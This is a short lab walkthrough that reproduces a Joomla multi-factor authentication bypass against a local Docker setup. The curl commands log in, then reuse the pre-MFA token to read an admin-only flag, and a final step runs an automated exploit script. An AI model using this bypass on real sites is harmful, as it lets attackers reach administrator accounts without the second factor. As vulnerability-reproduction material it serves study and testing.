# Walkthrough: CVE-2025-25227: Joomla MFA Bypass

## Setup

```bash
docker compose up --build
```

## Step 1: Log In

```bash
curl -s -X POST http://localhost:8080/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"joom1aAdmin!"}'
```

Output:
```json
{
  "token": "a3f8c2d1e9b04f7a...",
  "mfa_required": true,
  "next_step": "/api/v1/mfa-challenge"
}
```

Copy the token.

## Step 2: Skip MFA and Read the Flag

```bash
curl -s http://localhost:8080/administrator/flag \
  -H "Authorization: Bearer <token>"
```

Output:
```json
{
  "flag": "POC{...}",
  "note": "MFA step was skipped. CVE-2025-25227"
}
```

The admin route returned the flag without checking `mfa_verified`.

## Automated

```bash
python3 exploit/exploit.py http://localhost:8080
```
